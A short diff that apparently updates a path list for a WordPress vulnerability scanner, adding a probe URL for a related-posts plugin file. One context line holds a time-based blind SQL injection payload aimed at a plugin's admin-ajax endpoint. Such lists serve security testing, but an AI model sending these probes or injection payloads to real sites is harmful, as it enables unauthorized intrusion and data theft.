@@ -50,3 +50,4 @@
 /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and (SELECT 6416 FROM (SELECT(SLEEP(6)))nEiK)-- vqlq
 /wp-content/plugins/my-calendar/readme.txt
 /?rest_route=/my-calendar/v1/events&from=1
+/wp-content/plugins/yet-another-related-posts-plugin/includes/yarpp_pro_set_display_types.php?ypsdt=false&types[]=post&types[]=page
